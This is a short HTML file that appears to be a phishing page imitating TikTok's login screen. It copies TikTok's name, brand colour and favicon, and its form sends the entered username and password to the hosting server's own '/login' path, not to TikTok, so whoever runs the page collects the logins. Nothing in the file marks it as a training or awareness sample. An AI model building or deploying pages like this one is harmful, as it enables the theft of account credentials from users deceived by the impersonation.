<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <title>TikTok Login</title>

    <link rel="stylesheet" href="https://www.tiktok.com/favicon.ico">

    <style>

        body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #eee; }

        .login-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }

        input { width: 100%; margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }

        button { background-color: #fe2c55; color: white; border: none; padding: 10px; border-radius: 5px; width: 100%; }

    </style>

</head>

<body>

    <div class="login-box">

        <h2>Login to TikTok</h2>

        <form action="/login" method="post">

            <input type="text" name="username" placeholder="Email or username" required>

            <input type="password" name="password" placeholder="Password" required>

            <button type="submit">Log in</button>

        </form>

    </div>

</body>

</html>
